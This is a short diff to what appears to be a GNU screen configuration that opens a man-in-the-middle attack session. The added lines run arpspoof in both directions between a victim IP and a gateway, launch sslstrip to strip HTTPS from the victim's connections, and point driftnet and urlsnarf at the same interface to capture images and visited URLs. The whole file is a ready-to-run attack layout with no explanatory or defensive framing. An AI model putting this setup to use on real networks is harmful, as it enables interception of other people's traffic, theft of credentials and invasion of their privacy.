@@ -1,8 +1,14 @@
 screen  
 split -v
+split
+split
+screen arpspoof -i $gateway_r -t $victimIP $gateway_r_ip
+focus down
+screen arpspoof -i $gateway_r -t $gateway_r_ip $victimIP
+focus down
+screen sslstrip -l 1000
 focus right
-screen driftnet -i wlan0
+screen driftnet -i $gateway_r
 split
 focus down
-screen urlsnarf -i wlan0
-focus left
+screen urlsnarf -i $gateway_r
